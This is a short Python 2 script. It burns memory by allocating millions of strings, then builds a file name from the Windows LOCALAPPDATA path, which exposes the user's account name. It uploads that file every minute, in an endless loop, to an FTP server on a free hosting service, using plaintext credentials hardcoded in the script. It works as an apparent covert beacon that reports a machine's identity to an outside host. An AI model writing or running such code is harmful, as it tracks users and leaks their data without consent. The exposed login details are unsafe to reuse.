 
import ftplib
from os import getenv
import time
import random


def doAllocate(size):
    result=size*[None]
    count=0
    for i in range(size):

        message= str(random.randint(1,100))+"some unique object %d" % ( i, )

        result[i]= message
    return result


doAllocate(2621440)
print "Allocated"

path = getenv("LOCALAPPDATA")#Specify your FTP Server address
path1= path.replace('\\','')	#Specify your FTP Server address
path2= path1.replace(':','')+'.txt'

fp=open(path2,'w+')
fp.close

def ftp(path2):
    while True:
        try:
            print "uploading"
            SERVER="files.000webhost.com" #Specify your FTP Server address
            USERNAME="rajshreezade01" #Specify your FTP Username
            PASSWORD="12345678" #Specify your FTP Password
            SSL=0 #Set 1 for SSL and 0 for normal connection
            OUTPUT_DIR="/" #Specify output directory here
            if SSL==0:
                ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
            elif SSL==1:
                ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
            ft.cwd(OUTPUT_DIR)
            fp=open(path2,'rb')
            cmd= 'STOR' +' '+path2
            ft.storbinary(cmd,fp)
            ft.quit()
            fp.close()
            print "uploaded" 
        except Exception as e:
            print(e)
        time.sleep(60)	
    return True

ftp(path2)
